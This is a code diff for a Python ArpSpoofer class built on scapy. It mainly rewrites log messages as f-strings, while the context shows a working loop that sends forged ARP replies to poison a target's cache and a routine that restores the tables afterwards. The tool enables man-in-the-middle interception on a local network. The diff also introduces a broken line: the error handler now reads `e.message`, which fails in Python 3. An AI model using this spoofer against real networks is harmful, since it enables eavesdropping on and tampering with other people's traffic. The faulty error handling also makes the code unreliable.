@@ -29,11 +29,11 @@ class ArpSpoofer:
         """
         targetMac = scapy.getmacbyip(targetIp)
         if targetMac == None:
-            self.logger.error("ARP request for IP address {} failed! Exiting...".format(targetIp))
+            self.logger.error(f"ARP request for IP address {targetIp} failed! Exiting...")
             sys.exit(1)
         else:
             while self.isRunning:
-                self.logger.debug("Sending ARP response to {} with spoofed IP address {}".format(targetIp, spoofIp))
+                self.logger.debug(f"Sending ARP response to {targetIp} with spoofed IP address {spoofIp}")
                 packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
@@ -47,13 +47,13 @@ class ArpSpoofer:
         :param source_ip: The spoofed IP address
         """
         try:
-            self.logger.info("Restoring ARP tables for target {} and spoofed IP address {}".format(destination_ip, source_ip))
+            self.logger.info(f"Restoring ARP tables for target {destination_ip} and spoofed IP address {source_ip}")
             destination_mac = scapy.getmacbyip(destination_ip)
             source_mac = scapy.getmacbyip(source_ip)
             packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False)
         except Exception as e:
-            self.logger.error("Error while restoring ARP tables: {}".format(e))
+            self.logger.error(f"Error while restoring ARP tables: {e.message}")
             if self.logger.level == logging.DEBUG:
                 traceback.print_exc()
 
@@ -68,7 +68,7 @@ class ArpSpoofer:
         self.spoofIp = spoofIp
         self.isRunning = True
 
-        self.logger.info("Starting ARP spoofing for target {} and spoofing IP address {}".format(targetIp, spoofIp))
+        self.logger.info(f"Starting ARP spoofing for target {targetIp} and spoofing IP address {spoofIp}")
         t1 = Thread(target=self._spoof, args=(targetIp, spoofIp))
         t1.start()
         
@@ -77,7 +77,7 @@ class ArpSpoofer:
         Stop the ARP spoofing process.
         """
         if self.isRunning and self.targetIp and self.spoofIp:
-            self.logger.info("Stopping ARP spoofing for target {}".format(self.targetIp))
+            self.logger.info(f"Stopping ARP spoofing for target {self.targetIp}")
             self.isRunning = False
             self._restore(self.targetIp, self.spoofIp)
         else:
